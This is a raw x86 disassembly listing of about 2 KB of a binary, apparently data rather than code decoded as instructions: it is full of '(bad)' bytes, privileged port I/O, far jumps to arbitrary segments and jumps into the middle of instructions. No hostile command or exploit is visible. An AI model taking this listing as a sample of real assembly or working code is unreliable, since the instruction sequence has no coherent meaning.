  4151b2:	mov    esi,0x6f33666a
  4151b7:	call   0x1eaa1dfa
  4151bc:	out    0xf8,al
  4151be:	stos   DWORD PTR es:[edi],eax
  4151bf:	push   ebp
  4151c0:	rcr    DWORD PTR [ecx],cl
  4151c2:	pop    ecx
  4151c3:	mov    WORD PTR [ebp-0x7c],es
  4151c6:	xor    edx,ecx
  4151c8:	leave  
  4151c9:	cli    
  4151ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151cb:	add    BYTE PTR [edx-0x76fd7481],0x4
  4151d2:	jns    0x4151f4
  4151d4:	mov    ch,0xd5
  4151d6:	xor    dl,cl
  4151d8:	out    dx,eax
  4151d9:	sbb    DWORD PTR [eax+0x29],ebx
  4151dc:	mov    ch,0x43
  4151de:	mul    ebx
  4151e0:	loope  0x415164
  4151e2:	jmp    0x4151cb
  4151e4:	aaa    
  4151e5:	adc    eax,0x173bacea
  4151ea:	retf   0x7a68
  4151ed:	pop    es
  4151ee:	and    DWORD PTR [ecx-0x74460451],eax
  4151f4:	mov    ebp,0xbdec52b3
  4151f9:	aaa    
  4151fa:	mov    esp,0x6a0b1dc0
  4151ff:	mov    bh,0x4e
  415201:	push   ebp
  415202:	icebp  
  415203:	mov    eax,ds:0xd9d0c4ee
  415208:	in     eax,dx
  415209:	jmp    0x415222
  41520b:	nop
  41520c:	add    BYTE PTR [ecx],0x33
  41520f:	ficom  DWORD PTR [ebx-0x508588a]
  415215:	dec    ebx
  415216:	or     dh,BYTE PTR [ebx-0xd]
  415219:	test   DWORD PTR [ebp+0x74],0x1a6ece40
  415220:	shl    esp,1
  415222:	sub    ch,ch
  415224:	test   al,0xb3
  415226:	pop    ss
  415227:	push   ecx
  415228:	rol    bh,cl
  41522a:	pop    esp
  41522b:	mov    dh,0xfe
  41522d:	mov    DWORD PTR [esi+ecx*4+0x9],ebp
  415231:	scas   eax,DWORD PTR es:[edi]
  415232:	inc    ecx
  415233:	sti    
  415234:	sub    ebx,DWORD PTR [ebp+0x6d]
  415237:	cld    
  415238:	div    al
  41523a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41523b:	jne    0x415237
  41523d:	cs js  0x415231
  415240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415241:	push   edx
  415242:	sub    al,BYTE PTR [ecx-0x7533bf07]
  415248:	push   esi
  415249:	fchs   
  41524b:	call   0xa236bbf0
  415250:	call   0x703d9c44
  415255:	ror    DWORD PTR [edx+eiz*1],0x94
  415259:	lds    ebp,FWORD PTR [eax+0x79]
  41525c:	mov    eax,ds:0x3125da37
  415261:	sbb    al,bh
  415263:	dec    ebp
  415264:	ja     0x4152ab
  415266:	js     0x4152b3
  415268:	xor    al,0x83
  41526a:	lea    edi,[ecx-0x28b4d4c2]
  415270:	sbb    al,0xf9
  415272:	pop    edx
  415273:	fmul   st,st(2)
  415275:	mov    eax,0x6fe1cbb7
  41527a:	pushf  
  41527b:	das    
  41527c:	(bad)
  415281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415282:	imul   ecx,esp,0xffffffd1
  415285:	aaa    
  415286:	cs das 
  415288:	fs pop ss
  41528a:	(bad)  
  41528b:	jge    0x4152f4
  41528d:	(bad)
  415291:	dec    eax
  415292:	imul   edx,DWORD PTR [esi-0x2c662a81],0x7b162ba8
  41529c:	int3   
  41529d:	test   eax,0x6d4d47a1
  4152a2:	ins    DWORD PTR es:[edi],dx
  4152a3:	aad    0x99
  4152a5:	dec    edx
  4152a6:	push   esp
  4152a7:	pop    edi
  4152a8:	mov    al,0xca
  4152aa:	cmp    eax,ebx
  4152ac:	nop
  4152ad:	push   ecx
  4152ae:	push   0xffffff92
  4152b0:	mov    bh,0xb9
  4152b2:	jmp    DWORD PTR [ebx-0x66da5674]
  4152b8:	push   ss
  4152b9:	pop    eax
  4152ba:	pop    ebp
  4152bb:	add    BYTE PTR [edi],ch
  4152bd:	and    eax,esp
  4152bf:	mov    ch,0xb1
  4152c1:	pop    esp
  4152c2:	push   ebx
  4152c3:	pop    ds
  4152c4:	jns    0x4152e9
  4152c6:	mov    al,ds:0xd4efdc33
  4152cb:	stos   BYTE PTR es:[edi],al
  4152cc:	push   esp
  4152cd:	inc    ecx
  4152ce:	mov    edi,0xebcee06b
  4152d3:	push   esp
  4152d4:	das    
  4152d5:	jmp    0x39871b72
  4152da:	adc    eax,0x2382f872
  4152df:	das    
  4152e0:	fadd   DWORD PTR [edi+0x6]
  4152e3:	xchg   ebp,eax
  4152e4:	adc    eax,0x8531bff8
  4152e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ea:	neg    ebp
  4152ec:	fimul  DWORD PTR [edi+0x2212efde]
  4152f2:	fist   DWORD PTR [edx]
  4152f4:	(bad)  
  4152f5:	jno    0x415340
  4152f7:	loope  0x4152a8
  4152f9:	mov    ah,0x1a
  4152fb:	xchg   esi,eax
  4152fc:	add    eax,0x56263237
  415301:	xor    BYTE PTR [edi-0x51],bl
  415304:	mov    bh,0x73
  415306:	test   ecx,ecx
  415308:	or     dl,BYTE PTR [edi]
  41530a:	inc    ecx
  41530b:	(bad)  
  41530d:	ins    BYTE PTR es:[edi],dx
  41530e:	(bad)  
  41530f:	cmp    ecx,edi
  415311:	inc    DWORD PTR [esi-0x19]
  415314:	addr16 pop es
  415316:	inc    esp
  415317:	xchg   edx,eax
  415318:	test   edi,edx
  41531a:	mov    ah,0x91
  41531c:	lods   eax,DWORD PTR ds:[esi]
  41531d:	call   0xad93:0xb9380643
  415324:	adc    eax,0x9f55af9c
  415329:	inc    eax
  41532a:	out    dx,eax
  41532b:	sub    eax,0xb228261e
  415330:	sbb    eax,DWORD PTR [ebx-0x6a]
  415333:	xchg   ebp,eax
  415334:	ficomp WORD PTR [edi+0x4ff0d5b0]
  41533a:	into   
  41533b:	sub    DWORD PTR [edx-0xbb0d4bf],edi
  415341:	scas   al,BYTE PTR es:[edi]
  415342:	enterw 0xfb90,0x7
  415347:	or     esp,DWORD PTR [edx-0x76]
  41534a:	jno    0x4153a9
  41534c:	ror    DWORD PTR [edx+0x58],cl
  41534f:	in     eax,0x2e
  415351:	aad    0x1b
  415353:	xor    DWORD PTR [ebx+0x2e],eax
  415356:	sahf   
  415357:	scas   eax,DWORD PTR es:[edi]
  415358:	inc    ecx
  415359:	cmp    edx,ebp
  41535b:	(bad)  
  41535d:	fwait
  41535e:	addr16 das 
  415360:	adc    ch,BYTE PTR [ecx]
  415362:	or     eax,0x24e8908
  415367:	in     eax,dx
  415368:	mov    edx,cs
  41536a:	leave  
  41536b:	loope  0x415393
  41536d:	add    DWORD PTR [ebx],0xb35c6018
  415373:	mov    al,ds:0x20e02507
  415378:	mov    gs,edi
  41537a:	ror    DWORD PTR ds:0x1c0d8ce2,1
  415380:	push   ss
  415381:	lock fs jbe 0x41539a
  415385:	jl     0x41533f
  415387:	pop    eax
  415388:	mov    cl,0x41
  41538a:	cdq    
  41538b:	retf   
  41538c:	scas   eax,DWORD PTR es:[edi]
  41538d:	pusha  
  41538e:	dec    esp
  41538f:	(bad)  
  415391:	cmp    esi,DWORD PTR ds:0xfb2abe6e
  415397:	test   ebp,eax
  415399:	repnz adc ah,ah
  41539c:	lahf   
  41539d:	jne    0x4153a4
  41539f:	mov    bh,0x64
  4153a1:	dec    ebp
  4153a2:	jb     0x4153c0
  4153a4:	dec    ebx
  4153a6:	inc    ecx
  4153a7:	pop    esp
  4153a8:	or     cl,dl
  4153aa:	mov    bh,cl
  4153ac:	sar    DWORD PTR [eax],cl
  4153ae:	mov    ah,0x1c
  4153b0:	stos   DWORD PTR es:[edi],eax
  4153b1:	jbe    0x4153fd
  4153b3:	pop    ss
  4153b4:	jmp    0x4153e5
  4153b6:	pop    ss
  4153b7:	(bad)  
  4153b8:	sbb    BYTE PTR [edi-0x6b69ee86],ch
  4153be:	out    dx,al
  4153bf:	push   esi
  4153c0:	imul   ebp,DWORD PTR [eax+eiz*8-0x7275779],0xffffff8d
  4153c8:	pop    ebx
  4153c9:	adc    DWORD PTR [ebx+0xc],0xfe304a50
  4153d0:	cmc    
  4153d1:	jne    0x415413
  4153d3:	mov    ebx,0xe2a4faac
  4153d8:	mov    cl,0x7b
  4153da:	fistp  QWORD PTR [esi-0x4979790b]
  4153e0:	and    BYTE PTR [edi+edi*8-0x410d4670],dl
  4153e7:	lahf   
  4153e8:	mov    ds:0xae7b9998,eax
  4153ed:	popf   
  4153ee:	hlt    
  4153ef:	xor    DWORD PTR [edi],ebp
  4153f1:	mov    eax,0x22276b0a
  4153f6:	mov    ebp,0x2f63e719
  4153fb:	push   ebx
  4153fc:	jle    0x415434
  4153fe:	dec    edx
  4153ff:	out    0x90,eax
  415401:	xchg   esp,eax
  415402:	rcr    DWORD PTR [ebx+0x5520535b],0xe4
  415409:	test   eax,0x37d26f10
  41540e:	ja     0x41540b
  415410:	adc    eax,0xa02cffa6
  415415:	pop    ebp
  415416:	sub    eax,0xbb20f41
  41541b:	xchg   DWORD PTR [edi+0x3c],ecx
  41541e:	ds pop ebp
  415420:	adc    eax,0xbdb01be3
  415425:	push   es
  415426:	scas   eax,DWORD PTR es:[edi]
  415427:	loope  0x41543a
  415429:	add    BYTE PTR [ecx],ch
  41542b:	(bad)  
  41542c:	stc    
  41542d:	repnz enter 0x4d81,0xbf
  415432:	in     eax,0xb9
  415434:	lods   al,BYTE PTR ds:[esi]
  415435:	loop   0x41549c
  415437:	stos   BYTE PTR es:[edi],al
  415438:	inc    ecx
  415439:	jae    0x4153fd
  41543b:	(bad)  
  41543c:	push   eax
  41543d:	leave  
  41543e:	inc    edi
  41543f:	sbb    eax,0x296907ee
  415444:	pop    ds
  415445:	xchg   esi,eax
  415446:	mov    BYTE PTR [ecx-0x54],al
  415449:	jl     0x415456
  41544b:	shl    DWORD PTR [edi+0x2f1471e1],0xa8
  415452:	push   ebx
  415453:	cmp    esi,DWORD PTR [edx+0x17130ca0]
  415459:	out    dx,al
  41545a:	push   eax
  41545b:	out    dx,eax
  41545c:	dec    edi
  41545d:	mov    ebx,0x8eeb9515
  415462:	outs   dx,DWORD PTR ds:[esi]
  415463:	(bad)  [edi-0x1cfb0c4c]
  415469:	sbb    BYTE PTR [ebp+0x6d90ed35],dl
  41546f:	or     DWORD PTR [ebx],esp
  415471:	les    esi,FWORD PTR [esi-0x45]
  415474:	out    0x29,eax
  415476:	pop    esp
  415477:	out    0x7b,al
  415479:	in     eax,0xe6
  41547b:	iretw  
  41547d:	outs   dx,BYTE PTR ds:[esi]
  41547e:	jge    0x4154df
  415480:	nop
  415481:	in     eax,0xb4
  415483:	dec    edx
  415484:	mov    ecx,0x546ab1e0
  415489:	cmp    ah,ch
  41548b:	dec    esp
  41548c:	(bad)  
  41548e:	pushf  
  41548f:	sbb    DWORD PTR [eax+0x36],edi
  415492:	lea    esp,ds:0x8e314fdd
  415498:	jge    0x415437
  41549a:	pop    edx
  41549b:	adc    DWORD PTR [esi+0x43eed130],esp
  4154a1:	adc    BYTE PTR [eax-0x70ddb1b6],al
  4154a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a8:	popa   
  4154a9:	push   0xffffffea
  4154ab:	adc    ebx,DWORD PTR [edi-0x76cb88f6]
  4154b1:	add    DWORD PTR [eax+0x36],ebp
  4154b4:	sbb    eax,0x323883ec
  4154b9:	test   BYTE PTR [edx+0x62],al
  4154bc:	fmul   st,st(5)
  4154be:	dec    esi
  4154bf:	pop    ecx
  4154c0:	pop    ecx
  4154c1:	dec    edi
  4154c2:	data16 adc BYTE PTR es:[ebx+ecx*8],cl
  4154c7:	sbb    ebx,DWORD PTR [esi+0x7f8bd15b]
  4154cd:	les    eax,FWORD PTR ds:0x5d356f1a
  4154d3:	mov    BYTE PTR [eax-0x1488348],dh
  4154d9:	mov    DWORD PTR [edi+0x7d],ebp
  4154dc:	add    al,0xfb
  4154de:	and    DWORD PTR [ebp+0xc],eax
  4154e1:	fst    st(2)
  4154e3:	dec    esi
  4154e4:	addr16 (bad) 
  4154e6:	and    bl,dl
  4154e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e9:	das    
  4154ea:	xchg   esp,eax
  4154eb:	fld    TBYTE PTR [edx+0x78832e1c]
  4154f1:	pusha  
  4154f2:	jnp    0x415487
  4154f4:	int    0x45
  4154f6:	dec    ebx
  4154f7:	sub    ah,BYTE PTR [ecx+0x452be557]
  4154fd:	add    al,0x6d
  4154ff:	icebp  
  415500:	aam    0x11
  415502:	pop    esi
  415503:	xchg   ecx,eax
  415504:	out    dx,al
  415505:	mov    cl,0x55
  415507:	or     ah,BYTE PTR [esi+0x38]
  41550a:	ror    BYTE PTR [eax-0x75],0xf9
  41550e:	push   ebx
  41550f:	iret   
  415510:	mov    eax,0xef570e6d
  415515:	loopne 0x41558b
  415517:	into   
  415518:	jmp    0x364c:0xcbf587a7
  41551f:	pusha  
  415520:	mov    eax,esi
  415522:	fisttp WORD PTR [esi+0x4b]
  415525:	mov    ds:0x9cefbf16,eax
  41552a:	jns    0x415507
  41552c:	sub    cl,al
  41552e:	arpl   WORD PTR [edx],di
  415530:	add    eax,0xdc823e1e
  415535:	outs   dx,DWORD PTR ds:[esi]
  415536:	scas   eax,DWORD PTR es:[edi]
  415537:	nop
  415538:	dec    edx
  415539:	in     al,0x2a
  41553b:	sub    BYTE PTR [ebx+0xd],0x71
  41553f:	jmp    0x704fc75e
  415544:	bound  esp,QWORD PTR [eax+0x732c13dd]
  41554a:	mov    esp,DWORD PTR [esi+edx*4-0xcd1f302]
  415551:	xor    BYTE PTR [edx+0x61f49182],ch
  415557:	and    ah,BYTE PTR cs:[edx]
  41555a:	test   BYTE PTR ss:[edi-0x4014a1c5],dh
  415561:	gs inc esi
  415563:	cwde   
  415564:	(bad)  
  415565:	mov    dh,0x11
  415567:	retf   0xa432
  41556a:	push   0xffffffba
  41556c:	cmp    DWORD PTR [ebp+eiz*8+0x19],eax
  415570:	add    bl,cl
  415572:	mov    dh,0x4c
  415574:	outs   dx,BYTE PTR ds:[esi]
  415575:	out    0x27,eax
  415577:	sub    BYTE PTR [ebx+0x3f362c20],bh
  41557d:	test   eax,0x987e87ea
  415582:	adc    esi,edi
  415584:	imul   esi,eax,0x646215c2
  41558a:	aaa    
  41558b:	(bad)  
  41558c:	in     al,dx
  41558d:	xchg   ebx,eax
  41558e:	mov    dl,0x38
  415590:	and    al,0xc
  415592:	add    al,0x89
  415594:	mov    dl,0x28
  415596:	mul    DWORD PTR [ebx]
  415598:	pop    ebp
  415599:	test   DWORD PTR [edi+edx*1],edi
  41559c:	push   eax
  41559d:	rol    DWORD PTR [eax],1
  41559f:	push   edx
  4155a0:	pop    es
  4155a1:	out    0x5f,eax
  4155a3:	and    al,0x9
  4155a5:	lea    esi,[edi+0x49]
  4155a8:	enter  0xde5c,0xe0
  4155ac:	xor    eax,0x5222882a
  4155b1:	mov    fs,WORD PTR [esi-0x622764c0]
  4155b7:	in     al,dx
  4155b8:	in     eax,dx
  4155b9:	sbb    eax,0x14b24281
  4155be:	ror    DWORD PTR [ecx-0x6c],1
  4155c1:	out    0xf7,eax
  4155c3:	out    0x3d,al
  4155c5:	test   al,0x17
  4155c7:	push   esi
  4155c8:	jmp    0x2256:0xf6460ecd
  4155cf:	add    ah,BYTE PTR ds:0xbc558813
  4155d5:	mov    ebp,0x40987723
  4155da:	mov    al,ds:0x66733eff
  4155df:	lahf   
  4155e0:	and    al,0xfd
  4155e2:	push   edx
  4155e3:	mov    ?,WORD PTR [eax+0x7fca083a]
  4155e9:	push   edx
  4155ea:	lds    ecx,FWORD PTR [edi]
  4155ec:	ret    
  4155ed:	std    
  4155ee:	adc    ecx,DWORD PTR [esi+0x53]
  4155f1:	lea    ebx,[eax+esi*4-0xf70ad77]
  4155f8:	int    0x5a
  4155fa:	mov    eax,0x25497dfc
  4155ff:	or     al,0xe8
  415601:	out    dx,al
  415602:	adc    DWORD PTR [eax],0xaf5bdafe
  415608:	or     eax,0x2221209e
  41560d:	pushf  
  41560e:	dec    ebp
  41560f:	std    
  415610:	pop    esi
  415611:	add    eax,0x14b377d1
  415616:	or     DWORD PTR [ebx+ecx*4-0x31],ebp
  41561a:	sbb    al,0x15
  41561c:	add    DWORD PTR [esi+eax*1+0x4e375632],esp
  415623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415624:	sbb    DWORD PTR [edx],0x1b
  415627:	scas   eax,DWORD PTR es:[edi]
  415628:	mov    ds,WORD PTR [ebx+0x7d]
  41562b:	jo     0x4156a8
  41562d:	loop   0x41566d
  41562f:	hlt    
  415630:	dec    ecx
  415631:	in     eax,dx
  415632:	xor    bl,ah
  415634:	push   edx
  415635:	jno    0x41564d
  415637:	aam    0x8e
  415639:	repnz icebp 
  41563b:	repnz dec esi
  41563d:	(bad)  
  41563e:	in     al,dx
  41563f:	fbld   TBYTE PTR [ecx+esi*1+0x59]
  415643:	test   BYTE PTR [edi-0x680ca8e4],dh
  415649:	and    al,0xfa
  41564b:	(bad)  
  41564c:	cld    
  41564d:	popa   
  41564e:	or     BYTE PTR [edi+0x62],ch
  415651:	xchg   esp,eax
  415652:	add    al,0x66
  415654:	mov    ch,ah
  415656:	xchg   edx,eax
  415657:	xor    eax,0xb4dff8f6
  41565c:	ins    DWORD PTR es:[edi],dx
  41565d:	cmp    esi,DWORD PTR [edi+0x6db93cf8]
  415663:	sbb    al,0x91
  415665:	xor    cl,BYTE PTR [ecx-0x69]
  415668:	mov    esp,0xe6808b70
  41566d:	stos   DWORD PTR es:[edi],eax
  41566e:	lods   al,BYTE PTR ds:[esi]
  41566f:	mov    al,ds:0xae7ec3f8
  415674:	pop    eax
  415675:	lods   al,BYTE PTR ds:[esi]
  415676:	sub    al,0xc4
  415678:	leave  
  415679:	les    edx,FWORD PTR [esi-0xbeb7341]
  41567f:	xchg   DWORD PTR [esi+0x1d7b4ef4],ebx
  415685:	shr    BYTE PTR [edi-0x40],cl
  415688:	int    0xc1
  41568a:	cmp    ebx,esp
  41568c:	push   DWORD PTR ds:0x284e29cb
  415692:	clc    
  415693:	aaa    
  415694:	xor    BYTE PTR [edx-0x1220f03b],bh
  41569a:	dec    ecx
  41569b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41569c:	loop   0x415638
  41569e:	jne    0x415648
  4156a0:	and    eax,0x22bb5875
  4156a5:	loopne 0x4156c1
  4156a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156a8:	sbb    ah,BYTE PTR [eax+0xe2f3ace]
  4156ae:	inc    edi
  4156af:	idiv   DWORD PTR [edi-0x5f0b733c]
  4156b5:	jns    0x415646
  4156b7:	test   al,al
  4156b9:	or     al,0x57
  4156bb:	jnp    0x41572e
  4156bd:	dec    edi
  4156be:	loope  0x415708
  4156c0:	ins    BYTE PTR es:[edi],dx
  4156c1:	sbb    ebp,eax
  4156c3:	rol    DWORD PTR [ecx],0x43
  4156c6:	arpl   WORD PTR [ebx+esi*1],di
  4156c9:	xchg   edx,eax
  4156ca:	mov    ecx,0x94fed4d0
  4156cf:	pop    edi
  4156d0:	push   esi
  4156d1:	neg    DWORD PTR [edi]
  4156d3:	scas   al,BYTE PTR es:[edi]
  4156d4:	test   eax,ebx
  4156d6:	xchg   ebx,eax
  4156d7:	xchg   ebp,eax
  4156d8:	int3   
  4156d9:	in     eax,0x7f
  4156db:	aam    0x5f
  4156dd:	xchg   ebp,eax
  4156de:	cmp    eax,0xaf696c72
  4156e3:	in     eax,0xe6
  4156e5:	lds    ebx,FWORD PTR [edi]
  4156e7:	popa   
  4156e8:	bound  ebx,QWORD PTR [edi]
  4156ea:	push   ds
  4156eb:	mov    ah,0xeb
  4156ed:	jl     0x415709
  4156ef:	mov    ebp,0x129b3b08
  4156f4:	cld    
  4156f5:	retf   
  4156f6:	lods   eax,DWORD PTR ds:[esi]
  4156f7:	cmc    
  4156f8:	push   0xffffff93
  4156fa:	xlat   BYTE PTR ds:[ebx]
  4156fb:	sbb    DWORD PTR [ecx],ebx
  4156fd:	shl    ebp,cl
  4156ff:	js     0x41575c
  415701:	mov    bh,0xf
  415703:	jne    0x415689
  415705:	sbb    al,0xf7
  415707:	outs   dx,DWORD PTR ds:[si]
  415709:	sbb    dh,BYTE PTR [eax+0x3e1395ff]
  41570f:	mov    edi,0xa8a623ef
  415714:	(bad)  [ecx+esi*2+0x55]
  415718:	jbe    0x415794
  41571a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41571b:	xchg   esp,eax
  41571c:	in     eax,dx
  41571d:	xor    eax,0xa9eaca8d
  415722:	fsub   DWORD PTR [esi+ebx*4]
  415725:	jns    0x415719
  415727:	es fdiv st(5),st
  41572a:	cmp    al,0xe1
  41572c:	shl    esi,1
  41572e:	(bad)  
  41572f:	cmp    al,BYTE PTR [esi-0x7f]
  415732:	mov    al,BYTE PTR [edx+0x68fd8ec6]
  415738:	adc    eax,0x60734ee
  41573d:	icebp  
  41573e:	xchg   ebx,eax
  41573f:	push   es
  415740:	les    esi,FWORD PTR [esi+0x6bc3c658]
  415746:	inc    eax
  415747:	mov    bl,al
  415749:	push   cs
  41574a:	call   0x34c3943e
  41574f:	imul   ebp,DWORD PTR [eax-0x7b],0xffffffce
  415753:	or     ebx,DWORD PTR [ebx-0x40]
  415756:	inc    edx
  415757:	push   edi
  415758:	arpl   WORD PTR [edx],sp
  41575a:	sub    dh,BYTE PTR [edx-0x30]
  41575d:	(bad)  
  41575e:	cld    
  41575f:	push   edi
  415760:	xor    DWORD PTR [eax-0x2e73e75d],0x1a6bc180
  41576a:	(bad)  
  41576b:	xchg   DWORD PTR [edi+0x30],ebx
  41576e:	inc    edx
  41576f:	fbstp  TBYTE PTR [ecx]
  415771:	mov    al,0xb8
  415773:	ds xchg edx,eax
  415775:	sar    BYTE PTR [ebx],1
  415777:	sti    
  415778:	push   ss
  415779:	xchg   esi,eax
  41577a:	in     al,dx
  41577b:	cdq    
  41577c:	add    cl,ch
  41577e:	jno    0x415750
  415780:	pop    esp
  415781:	out    0x75,al
  415783:	mov    edi,0x892f6a06
  415788:	bound  ecx,QWORD PTR [edx-0x1c2c14f1]
  41578e:	cli    
  41578f:	ins    DWORD PTR es:[edi],dx
  415790:	(bad)  
  415791:	in     al,dx
  415792:	cmp    ah,BYTE PTR [edx-0x2bda5abf]
  415798:	xor    BYTE PTR [edi-0xb51255c],cl
  41579e:	outs   dx,BYTE PTR ds:[esi]
  41579f:	jae    0x415779
  4157a1:	mov    edx,0x87ab8119
  4157a6:	pop    cx
  4157a8:	jbe    0x415733
  4157aa:	xor    esp,DWORD PTR [edx]
  4157ac:	or     BYTE PTR [edx+0x8364444],dh
  4157b2:	das    
  4157b3:	fisubr WORD PTR [eax-0x7e]
  4157b6:	xor    DWORD PTR [edi-0x4d],edx
  4157b9:	mov    al,ds:0xdcfdfda3
  4157be:	pop    eax
  4157bf:	dec    edx
  4157c0:	pop    ds
  4157c1:	in     eax,dx
  4157c2:	ret    0xc586
  4157c5:	in     eax,dx
  4157c6:	ds aad 0xee
  4157c9:	add    edi,DWORD PTR [esi]
  4157cb:	mov    dh,0x56
  4157cd:	fwait
  4157ce:	jb     0x41583e
  4157d0:	xchg   edi,eax
  4157d1:	push   esp
  4157d2:	fistp  QWORD PTR [edi]
  4157d4:	cmp    al,ah
  4157d6:	push   cs
  4157d7:	xor    cl,BYTE PTR [edx]
  4157d9:	sbb    al,0x26
  4157db:	pop    es
  4157dc:	xchg   esi,eax
  4157dd:	push   es
  4157de:	scas   eax,DWORD PTR es:[edi]
  4157df:	bound  esp,QWORD PTR [edi-0xd9668ed]
  4157e5:	std    
  4157e6:	mov    al,ds:0xae931088
  4157eb:	adc    al,0xbe
  4157ed:	popa   
  4157ee:	jne    0x41581a
  4157f0:	push   ecx
  4157f1:	in     al,0x5f
  4157f3:	cmp    eax,0x3ecd6658
  4157f8:	mov    dh,0xd0
  4157fa:	cmp    bh,al
  4157fc:	or     bl,0x1c
  4157ff:	arpl   WORD PTR [esi],dx
  415801:	icebp  
  415802:	adc    DWORD PTR [ebx-0x3159eeda],esi
  415808:	sub    al,0xb8
  41580a:	ret    0xc8bb
  41580d:	fs je  0x415807
  415810:	lds    ecx,FWORD PTR [esi+0x6c9e00c8]
  415816:	rcl    ecx,1
  415818:	adc    ax,0x2cbb
  41581c:	in     al,dx
  41581d:	sbb    cl,ch
  41581f:	sub    ebp,esp
  415821:	gs jp  0x4157b9
  415824:	lock or al,0x51
  415827:	sbb    ebp,ecx
  415829:	cwde   
  41582a:	jns    0x41580b
  41582c:	add    BYTE PTR [eax+0x13],ch
  41582f:	push   edx
  415830:	jecxz  0x41580a
  415832:	scas   eax,DWORD PTR es:[edi]
  415833:	shr    ah,cl
  415835:	mov    ah,0x75
  415837:	cmp    eax,0x1eeb9c40
  41583c:	loopne 0x4158ba
  41583e:	xchg   DWORD PTR [ebp-0x5064dedb],eax
  415844:	fsub   DWORD PTR [edx-0x31]
  415847:	adc    DWORD PTR [eax-0x57],0x1f309558
  41584e:	mov    ebp,0x9d102261
  415853:	dec    ecx
  415854:	pop    edi
  415855:	xchg   ecx,eax
  415856:	scas   al,BYTE PTR es:[edi]
  415857:	popa   
  415858:	ret    0xba89
  41585b:	xlat   BYTE PTR ds:[ebx]
  41585c:	xchg   esp,eax
  41585d:	mov    ecx,0x4896d5f6
  415862:	mov    ebp,0xc295d2db
  415867:	jne    0x4158d1
  415869:	loope  0x415885
  41586b:	adc    al,0xdb
  41586d:	mov    BYTE PTR [ecx+0x7d972532],ah
  415873:	(bad)  
  415874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415875:	dec    esi
  415876:	popa   
  415877:	test   eax,0x8aebd1fc
  41587c:	cmp    dl,BYTE PTR [eax+ecx*2]
  41587f:	jno    0x4158ba
  415881:	test   BYTE PTR [ebp+edi*8-0x40],0xd2
  415886:	rcl    BYTE PTR [edx],0xda
  415889:	sti    
  41588a:	xor    esi,DWORD PTR [edi-0x2b9e29d3]
  415890:	inc    ebp
  415891:	popa   
  415892:	adc    edi,DWORD PTR [ebp-0x4b]
  415895:	shr    DWORD PTR [edx],0x3f
  415898:	pop    esi
  415899:	jb     0x415830
  41589b:	ss std 
  41589d:	lahf   
  41589e:	adc    ebp,DWORD PTR [ebp+eax*2-0x1b74e80a]
  4158a5:	or     bh,BYTE PTR [edx+0x71]
  4158a8:	cwde   
  4158a9:	pop    ebp
  4158aa:	jnp    0x415831
  4158ac:	ret    
  4158ad:	xchg   edi,eax
  4158ae:	jno    0x41589c
  4158b0:	sbb    cl,BYTE PTR [edx-0x75]
  4158b3:	pop    ebp
  4158b4:	adc    al,0xf0
  4158b6:	dec    esi
  4158b7:	repz sbb ah,BYTE PTR [ebx+0x663c90f]
  4158be:	test   bh,cl
  4158c0:	fld    TBYTE PTR [ebx+0x21]
  4158c3:	jb     0x4158b0
  4158c5:	mov    al,0xa2
  4158c7:	call   ebp
  4158c9:	xchg   ecx,eax
  4158ca:	sbb    al,0xd0
  4158cc:	xor    BYTE PTR ds:0xd1318d24,bl
  4158d2:	scas   eax,DWORD PTR es:[edi]
  4158d3:	push   ebx
  4158d4:	out    0x77,eax
  4158d6:	into   
  4158d7:	add    eax,0x5589f409
  4158dc:	jle    0x415862
  4158de:	jmp    0x4158ba
  4158e0:	or     ebx,edx
  4158e2:	es loope 0x415921
  4158e5:	pushf  
  4158e6:	(bad)
  4158e9:	inc    esp
  4158ea:	ss or  ecx,ebx
  4158ed:	ror    BYTE PTR [ebx],cl
  4158ef:	(bad)  
  4158f0:	in     eax,0x13
  4158f2:	and    DWORD PTR [esp+ebx*4],edx
  4158f5:	or     BYTE PTR ds:0xf0f03ec8,al
  4158fb:	sub    ah,BYTE PTR [esi]
  4158fd:	cmc    
  4158fe:	sbb    edx,DWORD PTR [ecx]
  415900:	or     bh,ah
  415902:	dec    dl
  415904:	pop    ss
  415905:	jge    0x415986
  415907:	(bad)  
  415908:	je     0x4158dc
  41590a:	xchg   ebp,eax
  41590b:	out    0x47,eax
  41590d:	add    al,0xae
  41590f:	xchg   DWORD PTR [edi-0x33],ecx
  415912:	aam    0xc
  415914:	jge    0x415932
  415916:	(bad)
  415919:	jno    0x41591c
  41591b:	rol    cl,1
  41591d:	popa   
  41591e:	xchg   DWORD PTR [ebx-0x3c0e530d],edi
  415924:	idiv   cl
  415926:	rcl    dh,0x2b
  415929:	jl     0x4158c7
  41592b:	(bad)  
  41592c:	pop    edx
  41592d:	imul   DWORD PTR [esi]
  41592f:	sbb    al,0xbd
  415931:	cmp    eax,0x95a55073
  415936:	ret    
  415937:	mov    ah,BYTE PTR [edx]
  415939:	xchg   BYTE PTR [edx-0x4bd18cc],al
  41593f:	inc    ebp
  415940:	enter  0x82b0,0xcc
  415944:	cmp    eax,DWORD PTR [ebx]
  415946:	sub    al,0x9b
  415948:	stos   DWORD PTR es:[di],eax
  41594a:	inc    esp
  41594b:	out    dx,eax
  41594c:	push   es
  41594d:	sahf   
  41594e:	and    DWORD PTR [edi],0xd182a0fb
  415954:	(bad)  
  415955:	adc    eax,DWORD PTR [ebp-0x4b357977]
  41595b:	rcl    BYTE PTR [edx],cl
  41595d:	and    ebp,DWORD PTR [ebx+eax*1+0x25]
  415961:	sbb    DWORD PTR [ecx+0x39],ecx
  415964:	sbb    BYTE PTR [ebp+ebp*4+0x4d2f72ca],al
  41596b:	push   ebx
  41596c:	sbb    dl,BYTE PTR [ebx+0x13]
  41596f:	jae    0x415936
  415971:	out    dx,al
  415972:	repnz cwde 
  415974:	jnp    0x41590c
  415976:	mov    ch,0x2
